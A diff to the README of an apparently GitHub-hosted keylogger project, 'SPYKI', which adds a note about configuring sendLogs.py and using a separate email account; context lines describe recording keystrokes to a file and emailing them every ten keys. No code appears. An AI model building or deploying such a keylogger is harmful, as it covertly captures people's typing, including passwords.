@@ -1,4 +1,4 @@
-# SPYKI
+# SPYKI -
 
 ![Untitled design](https://github.com/adityaax/KeyLogger/assets/98630015/62e751c8-30ac-4166-be92-b183b354fda9)
 
@@ -33,3 +33,8 @@
 1. Listen the pressed key
 2. Add pressed key to the file
 3. After every 10 keys pressed, send it to the researcher's email.
+
+# NOTE
+:radioactive: `sendLogs.py` file need to be configured before use. 
+
+:radioactive: Create a seperate email id for this because it can comprise the security of the email id.
